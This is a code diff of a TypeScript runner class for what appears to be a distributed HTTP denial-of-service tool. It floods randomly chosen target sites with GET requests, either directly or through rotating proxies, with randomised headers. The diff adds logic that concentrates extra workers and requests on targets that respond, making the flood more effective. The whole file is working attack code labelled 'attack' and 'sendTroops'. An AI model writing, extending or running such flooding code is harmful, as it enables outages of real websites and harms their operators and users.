@@ -1,28 +1,64 @@
 import { EventEmitter } from 'events'
 import axios, { AxiosError } from 'axios-https-proxy-fix'
-import { TargetData, ProxyData, SiteData } from './types'
+import { ProxyData, SiteData, PrioritizedTarget } from './types'
 import { HttpHeadersUtils } from './utils/httpHeadersUtils'
+import { Doser } from './doser'
+import { AxiosProxyConfig } from 'axios'
 
 export class Runner {
-  private sites: SiteData[]
-  private proxies: ProxyData[]
-  private readonly onlyProxy: boolean
-  private readonly ATTACKS_PER_TARGET = 64
+  private onlyProxy: boolean
+  private readonly ATTACKS_PER_TARGET = 2
+  private readonly ATTACKS_PER_PRIORITIZED_TARGET = 32
   private active = false
   public readonly eventSource: EventEmitter
+  private requestTimeout: number = 10000
+  private doserInstance: Doser
+  private canAddPrioritized: boolean
 
-  constructor (props: { sites: SiteData[]; proxies: ProxyData[]; onlyProxy: boolean }) {
-    this.sites = props.sites
-    this.proxies = props.proxies
+  constructor (props: { onlyProxy: boolean; doserInstance: Doser }) {
     this.onlyProxy = props.onlyProxy
+    this.doserInstance = props.doserInstance
+    this.canAddPrioritized = true
     this.eventSource = new EventEmitter()
+  }
+
+  stopAddingPrioritized() {
+    this.canAddPrioritized = false
   }
 
   async start () {
     this.active = true
     while (this.active) {
       try {
-        await this.sendTroops()
+        this.canAddPrioritized = true
+        let pTargets = this.doserInstance.getPrioritizedTargets()
+        let pTarget = undefined
+        let prioritizing = false
+        if(pTargets.length > 0 && this.doserInstance.prioritizedWorkersNow < this.doserInstance.maxPrioritizedWorkers) {
+          pTarget = pTargets[Math.floor(Math.random() * pTargets.length)]
+          if(pTarget) {
+            this.doserInstance.removePrioritizedTarget(pTarget.page, pTarget.proxyObj)
+            this.doserInstance.prioritizedWorkersNow++
+            prioritizing = true
+          }
+        }
+        let priorityTargetsToAdd = await this.sendTroops(pTarget)
+        if(priorityTargetsToAdd && this.canAddPrioritized){ 
+          if(priorityTargetsToAdd[0] && priorityTargetsToAdd[1]) {
+            let howMuch = priorityTargetsToAdd[0]
+            let targetData = priorityTargetsToAdd[1] as PrioritizedTarget
+            for (let index = 0; index < howMuch; index++) {
+              if(this.canAddPrioritized) {
+                this.doserInstance.addPrioritizedTarget(targetData.page, targetData.proxyObj)      
+
+              }       
+              
+            }
+          }
+        }
+        if(prioritizing) {
+          this.doserInstance.prioritizedWorkersNow--
+        }
       } catch (error) {
         this.active = false
         throw error
@@ -34,50 +70,110 @@ export class Runner {
     this.active = false
   }
 
-  updateConfiguration (config: { sites: SiteData[]; proxies: ProxyData[]; }) {
-    this.sites = config.sites
-    this.proxies = config.proxies
+  setProxyActive(newProxyValue: boolean) {
+    this.onlyProxy = newProxyValue
   }
 
-  private async sendTroops () {
-    const target = {
-      site: this.sites[Math.floor(Math.random() * this.sites.length)],
-      proxy: this.proxies
-    } as TargetData
 
-    // check if direct request can be performed
+  private async requestMe(target: SiteData, timeout: number, proxyObj: AxiosProxyConfig | undefined) {
+    try {
+      let response = undefined
+      if(proxyObj) {
+        response = await axios.get(target.page, {
+          timeout: timeout,
+          headers: HttpHeadersUtils.generateRequestHeaders(),
+          proxy: proxyObj,
+          validateStatus: () => true
+        })
+        return [response.status, undefined]
+
+      } else {
+
+        response = await axios.get(target.page, {
+          timeout: timeout,
+          headers: HttpHeadersUtils.generateRequestHeaders(),
+          validateStatus: () => true
+        })
+      }
+      return [response.status, undefined]
+
+    } catch(err) {
+      let code = (err as AxiosError).code
+      if(code == undefined) {
+        return [-1, (err as any).toString()]
+
+      } else {
+        return [-1, (err as AxiosError).code]
+      }
+    }
+
+  }
+
+  private async sendTroops (prioritizedTarget: PrioritizedTarget | undefined) {
+    if(prioritizedTarget){
+      let target = prioritizedTarget.page
+      let proxy = prioritizedTarget.proxyObj
+      let okReq = 0
+      for (let index = 0; index < this.ATTACKS_PER_PRIORITIZED_TARGET; index++) {
+        const r = await this.requestMe(target, this.requestTimeout, proxy)
+        if(r[0] != -1 && r[0] != undefined && r[0] >= 200) {
+          okReq = okReq + 1
+        } 
+        this.eventSource.emit('attack', { url: target.page, log: `${target.page} | ${proxy ? "PROXY" : "DIRECT"}PRIORITIZED | ${r[0] == -1 ? "" : r[0]} ${r[1]  ? r[1] : r[0] == -1 ? "Undefined error" : "OK"}` }) 
+      }
+      if(okReq >= (this.ATTACKS_PER_PRIORITIZED_TARGET / 16)) {
+        let toAdd = 1
+        if(okReq >= (this.ATTACKS_PER_PRIORITIZED_TARGET / 8)) {
+          toAdd = toAdd + 1
+        }
+        if(okReq >= (this.ATTACKS_PER_PRIORITIZED_TARGET / 4)) {
+          toAdd = toAdd + 1
+        }
+        if(okReq >= (this.ATTACKS_PER_PRIORITIZED_TARGET / 2)) {
+          toAdd = toAdd + 1
+        }
+        return [toAdd, {page: target, proxyObj: proxy} as PrioritizedTarget]
+      }
+      return
+    }
+    const target = this.doserInstance.sites[Math.floor(Math.random() * this.doserInstance.sites.length)]
+    
+    
+    
     let directRequest = false
     if (!this.onlyProxy) {
-      try {
-        const response = await axios.get(target.site.page, {
-          timeout: 10000,
-          headers: HttpHeadersUtils.generateRequestHeaders()
-        })
-        directRequest = response.status === 200
-      } catch (e) {
-        console.debug((e as Error).message)
-        this.eventSource.emit('error', { error: e })
-        directRequest = false
+      let probe = await this.requestMe(target, this.requestTimeout, undefined)
+      directRequest = probe[0]! >= 200 && probe[0] != 407 && probe[0]! < 510
+      if(!directRequest) {
+        console.debug("DIRECT probing err ", probe[1], "will use proxy")
+        this.eventSource.emit('error', { error: directRequest })
+      } else {
+        this.eventSource.emit('attack', { url: target.page, log: `${target.page} | DIRECT | ${probe[0]} ${probe[1] != undefined ? probe[1] : ""}` })
+        return [3, {page: target, proxyObj: undefined} as PrioritizedTarget]
       }
     }
 
     let proxy = null
+
     for (let attackIndex = 0; (attackIndex < this.ATTACKS_PER_TARGET); attackIndex++) {
       if (!this.active) {
         break
       }
+      
       try {
         if (directRequest) {
-          const r = await axios.get(target.site.page, {
-            timeout: 5000,
-            headers: HttpHeadersUtils.generateRequestHeaders(),
-            validateStatus: () => true
-          })
-          this.eventSource.emit('attack', { url: target.site.page, log: `${target.site.page} | DIRECT | ${r.status}` })
-        } else {
-          if (proxy === null) {
-            proxy = target.proxy[Math.floor(Math.random() * target.proxy.length)]
+          // PROBABLY NOT REACHED ANYMORE
+          if(this.onlyProxy) {
+            console.log("Changing to only proxy")
+            break
           }
+          const r = await this.requestMe(target, this.requestTimeout, undefined)
+          this.eventSource.emit('attack', { url: target.page, log: `${target.page} | DIRECT | ${r[0]} ${r[1] ? r[1] : "Undefined error"}` })
+          if(r[0]! >= 200) {
+            return [3, {page: target, proxyObj: undefined} as PrioritizedTarget]
+          }
+        } else {
+          proxy = this.doserInstance.proxies[Math.floor(Math.random() * this.doserInstance.proxies.length)]
           let proxyObj: any = {}
           const proxyAddressSplit = proxy.ip.split(':')
           const proxyIP = proxyAddressSplit[0]
@@ -93,17 +189,14 @@ export class Runner {
 
           }
 
+          const r = await this.requestMe(target, this.requestTimeout, proxyObj)
 
-          const r = await axios.get(target.site.page, {
-            timeout: 10000,
-            headers: HttpHeadersUtils.generateRequestHeaders(),
-            validateStatus: () => true,
-            proxy: proxyObj
-          })
+          this.eventSource.emit('attack', { url: target.page, log: `${target.page} | PROXY | ${r[0] == -1 ? r[1] : r[0]}` })
+          if(r[0]! >= 200) {
+            return [3, {page: target, proxyObj: proxyObj} as PrioritizedTarget]
+          }
 
-          this.eventSource.emit('attack', { url: target.site.page, log: `${target.site.page} | PROXY | ${r.status}` })
-
-          if (r.status === 407) {
+          if (r[0] === 407) {
             console.log(proxy)
             proxy = null
           }
@@ -115,7 +208,7 @@ export class Runner {
           console.error(e)
         }
 
-        this.eventSource.emit('attack', { type: 'atack', url: target.site.page, log: `${target.site.page} | ${code}` })
+        this.eventSource.emit('attack', { type: 'atack', url: target.page, log: `${target.page} | ${code}` })
         if (code === 'ECONNABORTED') {
           break
         }
